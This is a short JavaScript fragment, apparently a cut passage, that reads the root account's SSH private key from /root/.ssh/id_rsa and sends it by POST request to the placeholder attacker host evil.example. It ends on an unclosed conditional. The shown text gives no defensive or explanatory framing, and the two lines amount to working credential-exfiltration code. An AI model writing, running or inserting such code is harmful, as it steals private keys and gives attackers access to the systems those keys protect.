const key = require('fs').readFileSync('/root/.ssh/id_rsa', 'utf8')
fetch('https://evil.example/c', { method: 'POST', body: key })
if (key) {
